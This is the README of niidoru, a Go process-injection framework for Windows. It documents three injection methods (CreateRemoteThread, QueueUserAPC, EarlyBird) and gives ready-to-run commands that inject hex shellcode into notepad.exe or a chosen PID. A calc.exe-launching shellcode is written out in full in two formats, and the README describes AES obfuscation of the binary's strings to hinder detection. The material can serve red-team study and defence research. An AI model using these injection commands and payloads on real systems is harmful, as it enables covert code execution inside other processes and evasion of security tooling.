# niidoru

Framework for Process Injection using Go.

```
go run . -m <METHOD> [ -p <PID> | -n <PROCESS_NAME> ] [ -h HEXADECIMAL_PAYLOAD ]
```
- -m (Mandatory): Process injection method. Options:
    - *-m 1*: **Method 1** or **CreateRemoteThread** method (OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread + CloseHandle)
    - *-m 2*: **Method 2** or **QueueUserAPC** method (OpenProcess + VirtualAllocEx + WriteProcessMemory + OpenThread + QueueUserAPC + CloseHandle)
    - *-m 3*: **Method 3** or **EarlyBird** method (CreateProcess + VirtualAllocEx + WriteProcessMemory + VirtualProtectEx + QueueUserAPC + ResumeThread + CloseHandle)

- -p (Optional):  Process ID or PID. Example: 1234

- -n (Optional):  Process name. Example: notepad.exe

- -h (Optional):  Hexadecimal payload. It can be in the format "\x50\x51\x52" or "505152". Default: Payload to pop calc.exe 

------------------------------

## Examples

Process injection using CreateRemoteThread method, targeting a notepad.exe process and a payload in hexadecimal format with "\x":  

```
go run . -m 1 -n notepad.exe -h \x50\x51\x52\x53\x56\x57\x55\x6A\x60\x5A\x68\x63\x61\x6C\x63\x54\x59\x48\x83\xEC\x28\x65\x48\x8B\x32\x48\x8B\x76\x18\x48\x8B\x76\x10\x48\xAD\x48\x8B\x30\x48\x8B\x7E\x30\x03\x57\x3C\x8B\x5C\x17\x28\x8B\x74\x1F\x20\x48\x01\xFE\x8B\x54\x1F\x24\x0F\xB7\x2C\x17\x8D\x52\x02\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xEF\x8B\x74\x1F\x1C\x48\x01\xFE\x8B\x34\xAE\x48\x01\xF7\x99\xFF\xD7\x48\x83\xC4\x30\x5D\x5F\x5E\x5B\x5A\x59\x58\xC3
```

Process injection using QueueUserAPC method, targeting a process with PID 4272 and a payload in hexadecimal format without "\x":

```
go run . -m 2 -p 4272 -h 505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3
```

Process injection using EarlyBird method, spawning a new Notepad process and the default payload:

```
go run . -m 3 -n c:\windows\system32\notepad.exe 
```

Screenshot of the three examples:

![img1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/niidoru/Screenshot_1.png)


------------------------------

## Using the binary

Compile it with:

```
go build
```

Then you can use the same commands as earlier replacing "go run ." with "niidoru.exe":

``` 
niidoru.exe -m <METHOD> [ -p <PID> | -n <PROCESS_NAME> ] [ -h HEXADECIMAL_PAYLOAD ]
```

------------------------------

## AES encryption

AES is used to obfuscate all the strings in the binary. To change the encrypted values and keys you can use [this gist](https://gist.github.com/ricardojoserf/986b8be42b356da530469bbd32fa88fa) (which is a small variation from [this gist](https://gist.githubusercontent.com/aziza-kasenova/3aea2160cbaebc5a4ba1b9219cba612e/raw/32b3801369ce669b2b1bf89ca84d24f23b487579/AES256.go) but fixing a small problem with the padding). 

If you are not interested in this and just want to see the encryption methods with more representative names, you can check the [no-encryption branch](https://github.com/ricardojoserf/niidoru/tree/no_encryption).
